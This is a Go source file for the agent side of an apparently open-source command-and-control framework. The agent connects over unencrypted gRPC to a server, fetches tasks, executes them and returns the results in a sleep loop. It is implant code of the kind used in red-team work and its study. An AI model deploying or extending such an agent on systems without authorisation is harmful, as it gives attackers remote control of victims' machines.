package main

import (
	"fmt"
	"log"
	"os"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"

	pb "github.com/chopper-c2-framework/c2-chopper/grpc/proto"
)

const UUID_FILE = "uuid.test"
const HOST = "localhost:9002"

var info *AgentInfo

func UpdateCwd() error {
	dir, err := os.Getwd()
	if err != nil {
		return err
	}
	info.Cwd = dir
	return nil
}

func InitServices(conn *grpc.ClientConn) *Services {
	AgentService := pb.NewAgentServiceClient(conn)
	TaskService := pb.NewTaskServiceClient(conn)
	return &Services{
		AgentService: AgentService,
		TaskService:  TaskService,
	}
}

func main() {
	conn, err := grpc.Dial(HOST, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		log.Panic("error connecting:", err)
		return
	}
	defer conn.Close()

	services := InitServices(conn)

	info = Connect(services)

	for {
		tasks, sleep, err := FetchTasks(services)
		if err != nil {
			log.Panic("Unable to fetch tasks")
		}

		fmt.Println("Fetched", len(tasks), "tasks")

		for _, task := range tasks {
			// This can become multithreaded in the future
			// But will require sync between { SendResult, Sleep } blocks
			result, err := ExecuteTask(task)
			if err != nil {
				log.Panic("Unable to execute task")
			}

			err = SendResult(services, result)
			if err != nil {
				log.Panic("Unable to submit task result")
			}

			time.Sleep(time.Duration(sleep * uint32(time.Second)))
		}
		time.Sleep(time.Duration(sleep * uint32(time.Second)))

	}
}
